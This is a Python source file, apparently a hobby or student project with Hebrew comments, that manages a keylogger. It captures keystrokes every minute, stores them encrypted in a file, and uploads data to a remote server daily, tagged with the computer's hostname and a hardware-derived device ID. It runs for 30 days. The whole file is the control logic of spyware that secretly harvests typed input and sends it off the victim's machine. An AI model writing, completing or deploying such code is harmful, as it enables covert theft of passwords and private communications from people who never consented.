from datetime import datetime
import time
import Encryptor
import threading
import uuid
import socket
from KeyLoggerService import KeyLogger
from Encryptor import Encryptor
from fileWriter import FileWriter
from write_to_network import NetworkWriter


class KeyLoggerManager:
    def __init__(self, file_save_time=60 * 10, stop_time= 30 * 24 * 60 * 60, server_upload_time=60 * 60 * 24):
        self.file_save_time = file_save_time
        self.server_upload_time = server_upload_time
        self.stop_time = stop_time
        self.buffer = {}
        self._KeyLogger = KeyLogger()
        self._Encryptor = Encryptor()
        self._FileWriter = FileWriter()
        self._FileWriter.deleting_contents()
        self._NetworkWriter = NetworkWriter()
        self.running = True  # משתנה בקרה להפסקת הלוגינג אחרי 30 יום
        self.lock = threading.Lock()  # יצירת מנעול
        # יצירת מזהה ייחודי על בסיס חומרת המחשב  וקבלת שם המחשב
        self.computer_name_device_id  = f"computer_name: {socket.gethostname()}. device_id: {str(uuid.getnode())}"

    def start_logging(self):
        self._KeyLogger.start_logging()
        threading.Thread(target=self.temporary_save_every_minute, daemon=True).start()
        threading.Thread(target=self.stop_logging_after_30_days, daemon=True).start()
        threading.Thread(target=self.save_to_file_every_day, daemon=True).start()
        threading.Thread(target=self.sending_to_server, daemon=True).start()

    def temporary_save_every_minute(self):
        while self.running:
            time.sleep(60)  # מחכה דקה
            with self.lock:
                info = self._KeyLogger.get_logged_keys()
                print(self.buffer)
                if info:
                    self.buffer[str(datetime.now())[:16]] = info
                    print("הוסף לזיכרון הפנימי")
                else:
                    print("לא היה הוספות")

    def save_to_file(self):
        with self.lock:
            buffer = self.buffer.copy()
            self.buffer.clear()
            for value in buffer:
                self._FileWriter.send_data(self._Encryptor.encrypt_text(str(value)))
                self._FileWriter.send_data(self._Encryptor.encrypt_text(str(buffer[value])))

    def save_to_file_every_day(self):
        while self.running:
            time.sleep(self.file_save_time)
            self.save_to_file()

    def sending_to_server(self):
        while self.running:
            time.sleep(self.server_upload_time)  # מחכה יום
            self._NetworkWriter.send_data(machine_name=self.computer_name_device_id)


    def stop_logging_after_30_days(self):
        """
        מחכה 30 ימים ועוצר את התוכנית
        :return:
        """
        time.sleep(self.stop_time)
        self.save_to_file()
        self._KeyLogger.stop_logging()
        self.running = False
        print("עוצר את התוכנית")


if __name__ == "__main__":
    manager = KeyLoggerManager(file_save_time=90)
    manager.start_logging()

